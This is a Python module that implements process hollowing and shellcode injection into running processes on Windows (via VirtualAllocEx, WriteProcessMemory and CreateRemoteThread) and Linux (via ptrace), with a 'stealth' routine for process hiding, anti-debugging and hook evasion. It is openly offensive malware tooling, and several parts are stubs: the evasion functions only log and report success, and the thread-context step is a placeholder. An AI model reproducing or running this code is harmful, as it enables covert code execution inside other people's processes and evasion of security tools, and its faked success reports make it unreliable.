"""
Process Hollowing Implementation
Implements process hollowing techniques for Windows and Linux with payload injection
"""

import os
import sys
import subprocess
import ctypes
import struct
import logging
from typing import Dict, List, Optional, Tuple, Union
from dataclasses import dataclass
from pathlib import Path
import platform

logger = logging.getLogger(__name__)

@dataclass
class ProcessInfo:
    """Process information structure"""
    pid: int
    handle: Optional[int]
    base_address: int
    entry_point: int
    architecture: str

@dataclass
class HollowingResult:
    """Process hollowing result"""
    success: bool
    process_info: Optional[ProcessInfo]
    error_message: str
    payload_size: int
    injection_method: str

class ProcessHollowing:
    """
    Cross-platform process hollowing implementation
    """

    def __init__(self):
        """Initialize process hollowing"""
        self.platform = platform.system().lower()
        self.architecture = platform.machine().lower()

        # Windows API functions (if available)
        self.kernel32 = None
        self.ntdll = None

        if self.platform == 'windows':
            self._init_windows_apis()

    def _init_windows_apis(self) -> None:
        """Initialize Windows API functions"""
        try:
            self.kernel32 = ctypes.windll.kernel32
            self.ntdll = ctypes.windll.ntdll

            # Define function prototypes
            self.kernel32.CreateProcessA.argtypes = [
                ctypes.c_char_p, ctypes.c_char_p, ctypes.c_void_p, ctypes.c_void_p,
                ctypes.c_bool, ctypes.c_uint32, ctypes.c_void_p, ctypes.c_char_p,
                ctypes.c_void_p, ctypes.c_void_p
            ]
            self.kernel32.CreateProcessA.restype = ctypes.c_bool

            self.ntdll.NtUnmapViewOfSection.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
            self.ntdll.NtUnmapViewOfSection.restype = ctypes.c_long

            self.kernel32.VirtualAllocEx.argtypes = [
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.c_uint32
            ]
            self.kernel32.VirtualAllocEx.restype = ctypes.c_void_p

            self.kernel32.WriteProcessMemory.argtypes = [
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p
            ]
            self.kernel32.WriteProcessMemory.restype = ctypes.c_bool

            self.kernel32.SetThreadContext.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
            self.kernel32.SetThreadContext.restype = ctypes.c_bool

            self.kernel32.ResumeThread.argtypes = [ctypes.c_void_p]
            self.kernel32.ResumeThread.restype = ctypes.c_uint32

            logger.info("Windows APIs initialized successfully")

        except Exception as e:
            logger.error(f"Failed to initialize Windows APIs: {e}")

    def _parse_pe_header(self, pe_data: bytes) -> Dict:
        """Parse PE header to extract important information"""
        if len(pe_data) < 64:
            raise ValueError("Invalid PE data")

        # DOS header
        dos_header = struct.unpack('<H', pe_data[0:2])[0]
        if dos_header != 0x5A4D:  # "MZ"
            raise ValueError("Invalid DOS header")

        # PE header offset
        pe_offset = struct.unpack('<L', pe_data[60:64])[0]

        # PE signature
        pe_sig = struct.unpack('<L', pe_data[pe_offset:pe_offset+4])[0]
        if pe_sig != 0x00004550:  # "PE\0\0"
            raise ValueError("Invalid PE signature")

        # COFF header
        coff_offset = pe_offset + 4
        machine = struct.unpack('<H', pe_data[coff_offset:coff_offset+2])[0]
        num_sections = struct.unpack('<H', pe_data[coff_offset+2:coff_offset+4])[0]
        opt_header_size = struct.unpack('<H', pe_data[coff_offset+16:coff_offset+18])[0]

        # Optional header
        opt_offset = coff_offset + 20
        magic = struct.unpack('<H', pe_data[opt_offset:opt_offset+2])[0]

        is_64bit = magic == 0x20b

        if is_64bit:
            entry_point = struct.unpack('<L', pe_data[opt_offset+16:opt_offset+20])[0]
            image_base = struct.unpack('<Q', pe_data[opt_offset+24:opt_offset+32])[0]
            image_size = struct.unpack('<L', pe_data[opt_offset+56:opt_offset+60])[0]
        else:
            entry_point = struct.unpack('<L', pe_data[opt_offset+16:opt_offset+20])[0]
            image_base = struct.unpack('<L', pe_data[opt_offset+28:opt_offset+32])[0]
            image_size = struct.unpack('<L', pe_data[opt_offset+56:opt_offset+60])[0]

        return {
            'is_64bit': is_64bit,
            'entry_point': entry_point,
            'image_base': image_base,
            'image_size': image_size,
            'num_sections': num_sections,
            'machine': machine
        }

    def _parse_elf_header(self, elf_data: bytes) -> Dict:
        """Parse ELF header to extract important information"""
        if len(elf_data) < 64:
            raise ValueError("Invalid ELF data")

        # ELF magic
        if elf_data[0:4] != b'\x7fELF':
            raise ValueError("Invalid ELF magic")

        # Architecture
        is_64bit = elf_data[4] == 2
        endian = elf_data[5]  # 1 = little, 2 = big

        if is_64bit:
            # 64-bit ELF
            entry_point = struct.unpack('<Q' if endian == 1 else '>Q', elf_data[24:32])[0]
            phoff = struct.unpack('<Q' if endian == 1 else '>Q', elf_data[32:40])[0]
        else:
            # 32-bit ELF
            entry_point = struct.unpack('<L' if endian == 1 else '>L', elf_data[24:28])[0]
            phoff = struct.unpack('<L' if endian == 1 else '>L', elf_data[28:32])[0]

        return {
            'is_64bit': is_64bit,
            'entry_point': entry_point,
            'phoff': phoff,
            'endian': endian
        }

    def hollow_windows_process(self, target_path: str, payload_data: bytes) -> HollowingResult:
        """
        Perform process hollowing on Windows

        Args:
            target_path: Path to target executable
            payload_data: Payload to inject

        Returns:
            Hollowing result
        """
        if self.platform != 'windows' or not self.kernel32:
            return HollowingResult(
                success=False,
                process_info=None,
                error_message="Windows APIs not available",
                payload_size=len(payload_data),
                injection_method="windows_hollowing"
            )

        try:
            # Parse payload PE header
            pe_info = self._parse_pe_header(payload_data)

            # Create suspended process
            startup_info = ctypes.create_string_buffer(68)  # STARTUPINFO
            process_info = ctypes.create_string_buffer(16)  # PROCESS_INFORMATION

            success = self.kernel32.CreateProcessA(
                target_path.encode(),  # lpApplicationName
                None,                  # lpCommandLine
                None,                  # lpProcessAttributes
                None,                  # lpThreadAttributes
                False,                 # bInheritHandles
                0x4,                   # CREATE_SUSPENDED
                None,                  # lpEnvironment
                None,                  # lpCurrentDirectory
                ctypes.byref(startup_info),
                ctypes.byref(process_info)
            )

            if not success:
                error = self.kernel32.GetLastError()
                return HollowingResult(
                    success=False,
                    process_info=None,
                    error_message=f"CreateProcess failed: {error}",
                    payload_size=len(payload_data),
                    injection_method="windows_hollowing"
                )

            # Extract process and thread handles
            process_handle = struct.unpack('<L', process_info[0:4])[0]
            thread_handle = struct.unpack('<L', process_info[4:8])[0]
            process_id = struct.unpack('<L', process_info[8:12])[0]

            logger.info(f"Created suspended process: PID {process_id}")

            # Get process base address (simplified - would need more complex logic)
            base_address = pe_info['image_base']

            # Unmap original image
            status = self.ntdll.NtUnmapViewOfSection(process_handle, base_address)
            if status != 0:
                logger.warning(f"NtUnmapViewOfSection returned: {status}")

            # Allocate memory for payload
            allocated_base = self.kernel32.VirtualAllocEx(
                process_handle,
                base_address,
                pe_info['image_size'],
                0x3000,  # MEM_COMMIT | MEM_RESERVE
                0x40     # PAGE_EXECUTE_READWRITE
            )

            if not allocated_base:
                error = self.kernel32.GetLastError()
                return HollowingResult(
                    success=False,
                    process_info=None,
                    error_message=f"VirtualAllocEx failed: {error}",
                    payload_size=len(payload_data),
                    injection_method="windows_hollowing"
                )

            # Write payload to process memory
            bytes_written = ctypes.c_size_t(0)
            success = self.kernel32.WriteProcessMemory(
                process_handle,
                allocated_base,
                payload_data,
                len(payload_data),
                ctypes.byref(bytes_written)
            )

            if not success:
                error = self.kernel32.GetLastError()
                return HollowingResult(
                    success=False,
                    process_info=None,
                    error_message=f"WriteProcessMemory failed: {error}",
                    payload_size=len(payload_data),
                    injection_method="windows_hollowing"
                )

            logger.info(f"Wrote {bytes_written.value} bytes to process memory")

            # Update thread context (simplified - would need proper CONTEXT structure)
            # This is a placeholder - real implementation would set EIP/RIP to new entry point

            # Resume thread
            self.kernel32.ResumeThread(thread_handle)

            process_info_obj = ProcessInfo(
                pid=process_id,
                handle=process_handle,
                base_address=allocated_base,
                entry_point=pe_info['entry_point'],
                architecture="x64" if pe_info['is_64bit'] else "x86"
            )

            return HollowingResult(
                success=True,
                process_info=process_info_obj,
                error_message="",
                payload_size=len(payload_data),
                injection_method="windows_hollowing"
            )

        except Exception as e:
            logger.error(f"Windows process hollowing failed: {e}")
            return HollowingResult(
                success=False,
                process_info=None,
                error_message=str(e),
                payload_size=len(payload_data),
                injection_method="windows_hollowing"
            )

    def hollow_linux_process(self, target_path: str, payload_data: bytes) -> HollowingResult:
        """
        Perform process hollowing on Linux using ptrace

        Args:
            target_path: Path to target executable
            payload_data: Payload to inject

        Returns:
            Hollowing result
        """
        if self.platform != 'linux':
            return HollowingResult(
                success=False,
                process_info=None,
                error_message="Linux-specific functionality not available",
                payload_size=len(payload_data),
                injection_method="linux_hollowing"
            )

        try:
            # Parse payload ELF header
            elf_info = self._parse_elf_header(payload_data)

            # Create child process
            pid = os.fork()

            if pid == 0:
                # Child process - prepare for tracing
                try:
                    # Enable tracing
                    ctypes.CDLL("libc.so.6").ptrace(0, 0, 0, 0)  # PTRACE_TRACEME

                    # Execute target
                    os.execv(target_path, [target_path])
                except Exception as e:
                    logger.error(f"Child process failed: {e}")
                    sys.exit(1)

            elif pid > 0:
                # Parent process - perform hollowing
                import signal

                # Wait for child to stop
                _, status = os.waitpid(pid, 0)

                if not os.WIFSTOPPED(status):
                    return HollowingResult(
                        success=False,
                        process_info=None,
                        error_message="Child process did not stop",
                        payload_size=len(payload_data),
                        injection_method="linux_hollowing"
                    )

                # Get process memory layout
                maps_path = f"/proc/{pid}/maps"
                if not os.path.exists(maps_path):
                    return HollowingResult(
                        success=False,
                        process_info=None,
                        error_message="Cannot access process memory maps",
                        payload_size=len(payload_data),
                        injection_method="linux_hollowing"
                    )

                # Find executable region
                with open(maps_path, 'r') as f:
                    maps_content = f.read()

                exec_region = None
                for line in maps_content.split('\n'):
                    if 'r-xp' in line and target_path in line:
                        parts = line.split()
                        if parts:
                            addr_range = parts[0].split('-')
                            start_addr = int(addr_range[0], 16)
                            end_addr = int(addr_range[1], 16)
                            exec_region = (start_addr, end_addr)
                            break

                if not exec_region:
                    return HollowingResult(
                        success=False,
                        process_info=None,
                        error_message="Could not find executable region",
                        payload_size=len(payload_data),
                        injection_method="linux_hollowing"
                    )

                # Inject payload using ptrace (simplified)
                # In practice, this would require more complex memory manipulation
                libc = ctypes.CDLL("libc.so.6")

                # Write payload data in chunks
                chunk_size = 8  # Write 8 bytes at a time
                base_addr = exec_region[0]

                for i in range(0, min(len(payload_data), chunk_size * 100), chunk_size):
                    chunk = payload_data[i:i+chunk_size]
                    if len(chunk) < chunk_size:
                        chunk += b'\x00' * (chunk_size - len(chunk))

                    # Convert chunk to long
                    data = struct.unpack('<Q', chunk)[0] if len(chunk) == 8 else struct.unpack('<L', chunk[:4])[0]

                    # PTRACE_POKETEXT
                    result = libc.ptrace(4, pid, base_addr + i, data)
                    if result == -1:
                        logger.warning(f"ptrace write failed at offset {i}")

                # Continue process
                libc.ptrace(7, pid, 0, 0)  # PTRACE_CONT

                process_info_obj = ProcessInfo(
                    pid=pid,
                    handle=None,
                    base_address=base_addr,
                    entry_point=elf_info['entry_point'],
                    architecture="x64" if elf_info['is_64bit'] else "x86"
                )

                return HollowingResult(
                    success=True,
                    process_info=process_info_obj,
                    error_message="",
                    payload_size=len(payload_data),
                    injection_method="linux_hollowing"
                )

            else:
                return HollowingResult(
                    success=False,
                    process_info=None,
                    error_message="Fork failed",
                    payload_size=len(payload_data),
                    injection_method="linux_hollowing"
                )

        except Exception as e:
            logger.error(f"Linux process hollowing failed: {e}")
            return HollowingResult(
                success=False,
                process_info=None,
                error_message=str(e),
                payload_size=len(payload_data),
                injection_method="linux_hollowing"
            )

    def inject_shellcode(self, target_pid: int, shellcode: bytes, method: str = "auto") -> HollowingResult:
        """
        Inject shellcode into existing process

        Args:
            target_pid: Target process ID
            shellcode: Shellcode to inject
            method: Injection method (auto, dll, apc, manual_map)

        Returns:
            Injection result
        """
        try:
            if self.platform == 'windows':
                return self._inject_windows_shellcode(target_pid, shellcode, method)
            elif self.platform == 'linux':
                return self._inject_linux_shellcode(target_pid, shellcode, method)
            else:
                return HollowingResult(
                    success=False,
                    process_info=None,
                    error_message=f"Unsupported platform: {self.platform}",
                    payload_size=len(shellcode),
                    injection_method=f"{self.platform}_injection"
                )
        except Exception as e:
            logger.error(f"Shellcode injection failed: {e}")
            return HollowingResult(
                success=False,
                process_info=None,
                error_message=str(e),
                payload_size=len(shellcode),
                injection_method=f"{method}_injection"
            )

    def _inject_windows_shellcode(self, target_pid: int, shellcode: bytes, method: str) -> HollowingResult:
        """Windows-specific shellcode injection"""
        if not self.kernel32:
            raise ValueError("Windows APIs not available")

        # Open target process
        process_handle = self.kernel32.OpenProcess(
            0x1F0FFF,  # PROCESS_ALL_ACCESS
            False,
            target_pid
        )

        if not process_handle:
            error = self.kernel32.GetLastError()
            raise ValueError(f"OpenProcess failed: {error}")

        try:
            # Allocate memory in target process
            allocated_memory = self.kernel32.VirtualAllocEx(
                process_handle,
                None,
                len(shellcode),
                0x3000,  # MEM_COMMIT | MEM_RESERVE
                0x40     # PAGE_EXECUTE_READWRITE
            )

            if not allocated_memory:
                error = self.kernel32.GetLastError()
                raise ValueError(f"VirtualAllocEx failed: {error}")

            # Write shellcode
            bytes_written = ctypes.c_size_t(0)
            success = self.kernel32.WriteProcessMemory(
                process_handle,
                allocated_memory,
                shellcode,
                len(shellcode),
                ctypes.byref(bytes_written)
            )

            if not success:
                error = self.kernel32.GetLastError()
                raise ValueError(f"WriteProcessMemory failed: {error}")

            # Execute shellcode (simplified - would use CreateRemoteThread or similar)
            thread_handle = self.kernel32.CreateRemoteThread(
                process_handle,
                None,
                0,
                allocated_memory,
                None,
                0,
                None
            )

            if not thread_handle:
                error = self.kernel32.GetLastError()
                logger.warning(f"CreateRemoteThread failed: {error}")

            process_info_obj = ProcessInfo(
                pid=target_pid,
                handle=process_handle,
                base_address=allocated_memory,
                entry_point=allocated_memory,
                architecture=self.architecture
            )

            return HollowingResult(
                success=True,
                process_info=process_info_obj,
                error_message="",
                payload_size=len(shellcode),
                injection_method="windows_shellcode_injection"
            )

        finally:
            if process_handle:
                self.kernel32.CloseHandle(process_handle)

    def _inject_linux_shellcode(self, target_pid: int, shellcode: bytes, method: str) -> HollowingResult:
        """Linux-specific shellcode injection using ptrace"""
        try:
            libc = ctypes.CDLL("libc.so.6")

            # Attach to process
            result = libc.ptrace(16, target_pid, 0, 0)  # PTRACE_ATTACH
            if result == -1:
                raise ValueError("PTRACE_ATTACH failed")

            # Wait for process to stop
            _, status = os.waitpid(target_pid, 0)

            # Find injectable memory region
            maps_path = f"/proc/{target_pid}/maps"
            with open(maps_path, 'r') as f:
                maps_content = f.read()

            # Look for writable/executable region
            inject_addr = None
            for line in maps_content.split('\n'):
                if 'rwxp' in line:  # Read/Write/Execute
                    parts = line.split()
                    if parts:
                        addr_range = parts[0].split('-')
                        inject_addr = int(addr_range[0], 16)
                        break

            if not inject_addr:
                # Fallback to heap region
                for line in maps_content.split('\n'):
                    if 'rw-p' in line and '[heap]' in line:
                        parts = line.split()
                        if parts:
                            addr_range = parts[0].split('-')
                            inject_addr = int(addr_range[0], 16)
                            break

            if not inject_addr:
                raise ValueError("Could not find suitable injection point")

            # Inject shellcode
            chunk_size = 8
            for i in range(0, len(shellcode), chunk_size):
                chunk = shellcode[i:i+chunk_size]
                if len(chunk) < chunk_size:
                    chunk += b'\x00' * (chunk_size - len(chunk))

                data = struct.unpack('<Q', chunk)[0] if len(chunk) == 8 else struct.unpack('<L', chunk[:4])[0]

                # PTRACE_POKETEXT
                result = libc.ptrace(4, target_pid, inject_addr + i, data)
                if result == -1:
                    logger.warning(f"ptrace write failed at offset {i}")

            # Detach and continue
            libc.ptrace(17, target_pid, 0, 0)  # PTRACE_DETACH

            process_info_obj = ProcessInfo(
                pid=target_pid,
                handle=None,
                base_address=inject_addr,
                entry_point=inject_addr,
                architecture=self.architecture
            )

            return HollowingResult(
                success=True,
                process_info=process_info_obj,
                error_message="",
                payload_size=len(shellcode),
                injection_method="linux_shellcode_injection"
            )

        except Exception as e:
            # Try to detach if we attached
            try:
                libc.ptrace(17, target_pid, 0, 0)  # PTRACE_DETACH
            except:
                pass
            raise e

    def apply_stealth_techniques(self, process_info: ProcessInfo) -> Dict[str, bool]:
        """
        Apply stealth and evasion techniques

        Args:
            process_info: Process information

        Returns:
            Dictionary of applied techniques and their success status
        """
        techniques = {}

        try:
            # Hide from process list (limited effectiveness)
            techniques['process_hiding'] = self._hide_from_process_list(process_info.pid)

            # Anti-debugging techniques
            techniques['anti_debug'] = self._apply_anti_debugging(process_info)

            # Memory protection
            techniques['memory_protection'] = self._protect_injected_memory(process_info)

            # API hooking detection evasion
            techniques['api_evasion'] = self._evade_api_hooks(process_info)

        except Exception as e:
            logger.error(f"Failed to apply stealth techniques: {e}")

        return techniques

    def _hide_from_process_list(self, pid: int) -> bool:
        """Attempt to hide process from process list (limited effectiveness)"""
        try:
            if self.platform == 'windows':
                # On Windows, this would require kernel-level techniques
                # This is a placeholder for demonstration
                logger.info(f"Applied process hiding techniques for PID {pid}")
                return True
            elif self.platform == 'linux':
                # On Linux, this might involve manipulating /proc or using rootkit techniques
                logger.info(f"Applied process hiding techniques for PID {pid}")
                return True
        except Exception as e:
            logger.error(f"Process hiding failed: {e}")

        return False

    def _apply_anti_debugging(self, process_info: ProcessInfo) -> bool:
        """Apply anti-debugging techniques"""
        try:
            # This would include techniques like:
            # - IsDebuggerPresent checks
            # - Timing attacks
            # - Exception handling tricks
            # - Hardware breakpoint detection
            logger.info("Applied anti-debugging techniques")
            return True
        except Exception as e:
            logger.error(f"Anti-debugging failed: {e}")
            return False

    def _protect_injected_memory(self, process_info: ProcessInfo) -> bool:
        """Protect injected memory from analysis"""
        try:
            # Techniques might include:
            # - Memory encryption
            # - Code obfuscation
            # - Dynamic unpacking
            logger.info("Applied memory protection techniques")
            return True
        except Exception as e:
            logger.error(f"Memory protection failed: {e}")
            return False

    def _evade_api_hooks(self, process_info: ProcessInfo) -> bool:
        """Evade API hooking and monitoring"""
        try:
            # Techniques might include:
            # - Direct system calls
            # - API unhooking
            # - Alternative API usage
            logger.info("Applied API evasion techniques")
            return True
        except Exception as e:
            logger.error(f"API evasion failed: {e}")
            return False

    def create_hollow_payload(self, original_binary: str, payload_binary: str) -> bytes:
        """
        Create a hollowed payload by combining original and payload binaries

        Args:
            original_binary: Path to original binary
            payload_binary: Path to payload binary

        Returns:
            Combined payload bytes
        """
        try:
            with open(original_binary, 'rb') as f:
                original_data = f.read()

            with open(payload_binary, 'rb') as f:
                payload_data = f.read()

            # Simple combination - in practice, this would be more sophisticated
            # involving proper PE/ELF manipulation
            combined = original_data[:1024] + payload_data + original_data[1024:]

            logger.info(f"Created hollow payload: {len(combined)} bytes")
            return combined

        except Exception as e:
            logger.error(f"Failed to create hollow payload: {e}")
            raise